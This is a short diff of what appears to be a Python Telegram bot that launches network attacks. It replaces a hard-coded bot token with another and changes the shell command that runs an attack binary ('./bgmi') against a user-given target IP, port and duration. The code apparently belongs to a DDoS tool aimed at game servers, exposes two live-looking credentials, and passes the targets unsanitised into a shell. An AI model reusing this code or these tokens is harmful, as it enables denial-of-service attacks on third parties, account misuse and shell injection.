@@ -11,7 +11,7 @@ from threading import Thread
 loop = asyncio.get_event_loop()
 
 # Bot token
-TOKEN = '7559793418:AAEgHxs8JBV0rq0KK-E9AfMHV-NAT13ImrM'
+TOKEN = '7559793418:AAHZPlEbHtdIbVysh4MWBRpvp_dvxcOM7EQ'
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
 
@@ -31,7 +31,7 @@ CREATOR = "This File Is Made By @SahilModzOwner"  #DON'T CHANGE THIS WARNA ERROR
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./Moin {target_ip} {target_port} {duration} 1250"
+    command = f"./bgmi {target_ip} {target_port} {duration} 950"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
